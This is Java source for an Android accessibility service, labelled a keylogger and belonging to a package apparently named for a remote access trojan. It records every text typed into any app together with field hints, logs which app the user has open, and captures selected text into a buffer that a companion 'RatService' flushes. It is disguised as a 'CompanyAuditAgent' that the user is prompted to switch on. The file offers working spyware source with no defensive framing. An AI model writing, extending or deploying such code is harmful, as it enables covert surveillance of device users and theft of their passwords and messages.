package com.company.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * Accessibility-based keylogger.
 *
 * Captures:
 *   - Every text change in any input field (TYPE_VIEW_TEXT_CHANGED)
 *   - Window focus changes (which app / screen the user is on)
 *   - Clipboard content (TYPE_VIEW_TEXT_SELECTION_CHANGED)
 *
 * Enable in Settings → Accessibility → CompanyAuditAgent → Toggle ON
 * (the MainActivity prompts the user to do this during setup)
 */
public class KeylogService extends AccessibilityService {

    private static final String TAG      = "KeylogService";
    private static final int    MAX_LOGS = 50_000; // chars before auto-flush

    // Static buffer shared with RatService (same process)
    private static final StringBuilder logBuffer = new StringBuilder();
    private static final Object        lock       = new Object();

    private String  lastPkg    = "";
    private String  lastWindow = "";
    private final SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.US);

    // ── AccessibilityService ─────────────────────────────────────────────────

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       |
                AccessibilityEvent.TYPE_VIEW_FOCUSED             |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED     |
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags =
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.i(TAG, "keylogger connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String pkg = event.getPackageName() != null
                ? event.getPackageName().toString() : "?";

        int type = event.getEventType();

        // ── window change: log which app the user switched to ──────────────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!pkg.equals(lastPkg)) {
                lastPkg = pkg;
                CharSequence title = event.getText().isEmpty() ? "" : event.getText().get(0);
                String label = title != null ? title.toString() : "";
                if (!label.equals(lastWindow)) {
                    lastWindow = label;
                    append("\n[APP:" + pkg + " / " + label + " @ " + ts() + "]\n");
                }
            }
            return;
        }

        // ── text changed: log the new content of the field ─────────────────
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                String text = texts.get(0).toString();
                // Try to get field hint for context
                String hint = "";
                AccessibilityNodeInfo src = event.getSource();
                if (src != null) {
                    CharSequence h = src.getHintText();
                    if (h != null) hint = "[" + h + "] ";
                    src.recycle();
                }
                append(hint + text + "\n");
            }
        }

        // ── text selection: clipboard-style capture ─────────────────────────
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            AccessibilityNodeInfo src = event.getSource();
            if (src != null) {
                CharSequence txt = src.getText();
                if (txt != null && txt.length() > 0) {
                    append("[SEL:" + txt + "]\n");
                }
                src.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() { Log.w(TAG, "interrupted"); }

    // ── static API used by RatService ────────────────────────────────────────

    /** Retrieve and clear the log buffer. */
    public static String flushLogs() {
        synchronized (lock) {
            String data = logBuffer.toString();
            logBuffer.setLength(0);
            return data;
        }
    }

    /** Peek at current buffer size without clearing. */
    public static int bufferSize() {
        synchronized (lock) { return logBuffer.length(); }
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private void append(String s) {
        synchronized (lock) {
            logBuffer.append(s);
            if (logBuffer.length() > MAX_LOGS) {
                // Drop oldest half to make room
                logBuffer.delete(0, MAX_LOGS / 2);
            }
        }
    }

    private String ts() { return sdf.format(new Date()); }
}
